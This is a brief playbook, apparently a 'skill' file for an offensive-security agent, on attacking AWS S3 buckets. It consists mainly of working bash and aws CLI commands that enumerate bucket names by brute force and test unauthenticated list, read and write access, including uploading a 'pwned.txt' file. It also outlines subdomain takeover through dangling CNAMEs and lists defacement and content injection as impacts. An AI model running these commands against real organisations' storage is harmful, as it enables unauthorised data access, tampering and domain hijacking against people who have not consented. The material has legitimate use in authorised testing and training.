# SKILL: S3 Bucket Attacks
## Version: 1.0 | Domain: infra

---

## METHODOLOGY
```bash
# Enumerate bucket names
for prefix in "" "dev-" "prod-" "staging-" "backup-" "data-" "logs-"; do
  for name in "target" "targetcorp" "target-app"; do
    bucket="${prefix}${name}"
    code=$(aws s3 ls "s3://${bucket}" --no-sign-request 2>&1 | head -1)
    echo "$bucket: $code"
  done
done

# Test permissions
aws s3 ls s3://BUCKET --no-sign-request              # list
aws s3 cp s3://BUCKET/test.txt . --no-sign-request    # read
echo "test" | aws s3 cp - s3://BUCKET/pwned.txt --no-sign-request  # write
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request

# Find via CNAME
# If sub.target.com → BUCKET.s3.amazonaws.com and bucket doesn't exist → register it → subdomain takeover
```

## HIGH IMPACT
- **Public listing** → data enumeration → sensitive file download.
- **Public write** → deface / inject malicious content served from target domain.
- **Bucket takeover** → NoSuchBucket + CNAME → register → serve content under target.com.

## TOOLS
s3scanner, bucket-finder, AWSBucketDump, slurp

## REFERENCES
flaws.cloud
